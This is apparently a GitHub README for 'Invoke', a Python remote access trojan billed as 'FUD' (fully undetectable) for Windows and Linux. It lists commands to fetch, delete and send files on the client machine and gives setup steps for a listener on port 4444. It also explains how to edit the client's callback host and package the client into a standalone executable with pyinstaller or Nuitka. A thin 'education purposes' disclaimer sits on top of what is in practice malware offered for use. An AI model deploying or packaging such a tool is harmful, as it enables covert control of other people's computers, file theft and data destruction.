# Invoke (Python-RAT)
FUD Remote Administration tool for Windows Systems and linux written in Python3

## Disclamer

THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES! DO NOT USE IT TO INFLICT 
DAMAGE TO ANYONE! USING MY APPLICATION YOU ARE AUTHOMATICALLY AGREE WITH ALL RULES AND
TAKE RESPONSIBITITY FOR YOUR ACTION! THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES!
THE DEVELOPER ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE 
CAUSED BY THIS PROGRAM.

## Requirements
+ pyfiglet
+ getpass
+ socket
+ argparse

## Commands
+ getcwd - Gets Current Working Directory
+ listdir - List All Files in a Directory
+ download - Download a File
+ delete - Delete a File
+ send - Send a File
+ who - Shows You the Current User
+ init - Starts Process
+ exit - Exit Program

## Setup with git (Server side)
```
git clone https://github.com/gho3tface/Invoke.git

cd Invoke

chmod +x Invoke.py

pip install -r requirements.txt
```

## Setup with wget (Server side)
```
wget https://github.com/gho3tface/Invoke

cd Invoke

chmod +x Invoke.py

pip install -r requirements.txt
```

## Setup with git (Client side)
```
git clone https://github.com/gho3tface/Invoke.git

cd Invoke

chmod +x client.pyw

nano client.pyw (edit host and port)
```

## Setup with wget (Client side)
```
wget https://github.com/gho3tface/Invoke

cd Invoke

chmod +x client.pyw

nano client.pyw (edit host and port)
```
## Usage (Server side)
```
python3 Invoke.py --lhost 127.0.0.1 --lport 4444

python3 Invoke.py -l 127.0.0.1 -p 4444
```

## Usage (Client side)
```
python3 client.pyw
```

## Package with pyinstaller (Window systems)
```
pip install pyinstaller

pyinstaller --onefile client.pyw
```

## Package with Nuitka (Linux systems)
```
python3 -m pip install nuitka

python3 -m nuitka client.pyw
```


## General License
  
    Copyright (c) 2023

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
